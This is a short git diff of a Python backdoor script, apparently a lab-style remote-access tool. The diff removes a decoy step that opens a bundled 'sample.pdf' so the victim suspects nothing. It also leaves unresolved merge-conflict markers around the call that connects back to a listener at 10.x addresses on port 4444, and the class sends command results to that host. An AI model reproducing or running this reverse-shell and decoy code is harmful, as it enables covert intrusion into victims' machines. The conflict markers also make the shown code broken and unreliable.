@@ -63,11 +63,12 @@ class Backdoor:
                 
             self.reliable_send(command_result)
 
-file_name = sys._MEIPASS + "\sample.pdf"
-subprocess.Popen(file_name, shell=True)
-
 try:
-    my_backdoor = Backdoor('10.0.2.5', 4444)
+<<<<<<< HEAD
+    my_backdoor = Backdoor('10.0.2.6', 4444)
+=======
+    my_backdoor = Backdoor('10.38.1.110', 4444)
+>>>>>>> parent of f42a707 (Extention Spoof)
     my_backdoor.run()
 except Exception:
     sys.exit()
